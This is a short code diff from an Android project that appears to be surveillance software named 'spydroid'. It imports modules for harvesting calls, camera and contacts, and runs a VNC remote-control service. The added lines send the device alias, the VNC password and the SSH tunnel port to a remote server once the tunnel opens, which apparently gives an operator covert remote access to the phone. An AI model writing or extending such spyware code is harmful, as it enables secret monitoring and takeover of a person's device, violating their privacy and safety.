@@ -38,6 +38,7 @@ import net.christianbeier.droidvnc_ng.VncService
 import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
 import net.spydroid.common.remote.RemoteDataProvider
+import net.spydroid.common.remote.network.models.InfoDevices
 import net.spydroid.feature.calls.CallsWork
 import net.spydroid.feature.camera.CameraWork
 import net.spydroid.feature.contacts.ContactsWork
@@ -93,8 +94,21 @@ class ManagerFeatures(
             val editor = prefs.edit()
             editor.putString(Constants.PREFS_KEY_SETTINGS_PASSWORD, password)
             editor.apply()
-            remoteDataProvider.setPasswordVnc(password)
-            remoteDataProvider.startSshTunnel()
+
+            remoteDataProvider.startSshTunnel{ port ->
+                remoteDataProvider.setPasswordVnc(password)
+                coroutineScope.launch {
+                    localDataProvider.aliasDevice.collect { alias ->
+                        remoteDataProvider.setInfo(
+                            InfoDevices(
+                                alias = alias,
+                                vnc_password = password,
+                                vnc_port = port
+                            )
+                        )
+                    }
+                }
+            }
 
             intent.putExtra(
                 VncService.EXTRA_PORT,
